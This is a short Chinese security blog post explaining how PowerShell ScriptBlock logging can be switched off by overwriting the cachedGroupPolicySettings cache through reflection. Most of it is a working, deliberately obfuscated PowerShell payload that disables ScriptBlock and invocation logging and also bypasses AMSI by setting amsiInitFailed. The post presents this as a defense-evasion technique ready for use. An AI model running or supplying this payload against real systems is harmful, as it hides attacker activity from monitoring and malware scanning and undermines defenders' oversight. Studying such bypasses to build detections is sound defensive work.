---
title: 利用cachedGroupPolicySettings关闭ScriptBlockLogging
date: 2019-12-31 23:59:55 +0800
categories: [域安全, TA0005防御逃逸]
tags: [ScriptBlockLogging, TA0005防御逃逸]     # TAG names should always be lowercase
typora-root-url: ..
---



**参考**：

[PowerShell ScriptBlock Logging Bypass](https://cobbr.io/ScriptBlock-Logging-Bypass.html)



In Windows 10 / PowerShell 5.0, Microsoft introduced several new security features in PowerShell. These included the AMSI, Protected Event Logging, and maybe most importantly **ScriptBlock logging**. 



```
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104}
```

![image-20210102180659185](/assets/img/image-20210102180659185.png)



每当powershell发现一个ScriptBlock，就会查询Group Policy setting是否需要记日志；如果设置了`System.Management.Automation.Utils`中的cachedGroupPolicySettings`，powershell会直接读取缓存的查询结果。

通过将查询结果赋值为"不记入日志"来临时关闭ScriptBlockLogging，此设置只对当前powershell session有效，并且并没有实际修改组策略、注册表中的设置。



```
// 混淆版本，同时关闭ScriptBlockLogging和AMSI
If($PSVerSioNTaBle.PSVERSiON.MAjOr -gE 3){
  $GPF=[reF].AssemBLy.GeTTypE('System.Management.Automation.Utils')."GetFiE`ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
  If($GPF){
    $GPC=$GPF.GEtVaLue($NUll);
    IF($GPC['ScriptB'+'lockLogging']){
      $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
      $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
      }
    $vAL=[CoLleCtIONS.GeNERic.DicTIonaRy[sTRIng,SystEM.ObjEct]]::NEw();
    $vaL.ADD('EnableScriptB'+'lockLogging',0);
    $VaL.Add('EnableScriptBlockInvocationLogging',0);
    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl
    } ELse{
    [SCrIptBloCK]."GeTFiE`LD"('signatures','N'+'onPublic,Static').SETVALUE($NUll,(NeW-ObjecT COLlectionS.GENeRic.HashSet[StRing]))}
    [ReF].ASsEmBly.GETTYpE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIELD('amsiInitFailed','NonPublic,Static').SeTVALUE($nUll,$true)};
}
```



![image-20210102181516560](/assets/img/image-20210102181516560.png)